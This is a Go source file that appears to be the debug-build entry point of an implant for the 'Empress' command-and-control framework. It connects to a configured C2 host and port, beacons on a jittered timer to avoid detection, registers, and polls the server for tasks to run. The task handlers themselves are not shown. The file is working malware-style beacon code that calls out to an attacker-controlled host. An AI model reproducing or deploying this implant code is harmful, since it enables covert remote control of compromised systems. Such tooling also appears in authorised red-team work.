//go:build debug

package main

import (
	"fmt"
	"github.com/pygrum/Empress/c2"
	"github.com/pygrum/Empress/config"
	"github.com/pygrum/Empress/tasks"
	"github.com/pygrum/Empress/transport"
	log "github.com/sirupsen/logrus"
	"math/rand"
	"time"
)

var (
	client *c2.Client
)

func main() {
	if err := config.Initialize(); err != nil {
		log.Fatalf("failed to initialize config: %v", err)
	}
	if err := newClient(); err != nil {
		log.Fatalf("could not create new client: %v", err)
	}
	log.WithFields(log.Fields{
		"remoteAddr": client.Address,
	}).Infof("created new client %p", client)
	tickSalt := config.C.CallbackSalt
	r := rand.New(rand.NewSource(time.Now().Unix()))
	ticker := time.NewTicker((config.C.CallbackInterval * 1000 * time.Millisecond) - (tickSalt * time.Millisecond))
	for range ticker.C {
		// sleep for a random time between 0 and tickSalt milliseconds.
		// because the ticker ticks every interval-tickSalt seconds,
		time.Sleep(time.Duration(r.Intn(int(tickSalt))) * time.Millisecond)
		// first registration needs no data
		if err := run(c2.Registration(nil)); err != nil {
			// don't quit, keep trying to register
			log.Errorf("failed: %v", err)
		}
	}
}

func newClient() error {
	var err error
	addr := fmt.Sprintf("%s:%s", config.C.C2Host, config.C.C2Port)
	client, err = c2.NewClient(addr)
	if err != nil {
		return err
	}
	router := c2.NewRouter()
	tasks.SetTasks(router)
	client.SetRouter(router)
	return nil
}

func run(registration *transport.Registration) error {
	log.Infof("starting registration: %p", registration)
	// start by registering
	if !config.C.TCP {
		if err := client.Register(registration); err != nil {
			return err
		}
		log.Info("registration successful - attempting to poll")
		reg, err := client.Poll()
		if err != nil {
			// doesn't need to die since things can happen
			log.Errorf("polling failed: %v", err)
		}
		log.Infof("registration: %p", reg)
		return run(reg)
	} else {
		if err := client.PollTCP(); err != nil {
			log.Error(err)
			return err
		}
	}
	return nil
}
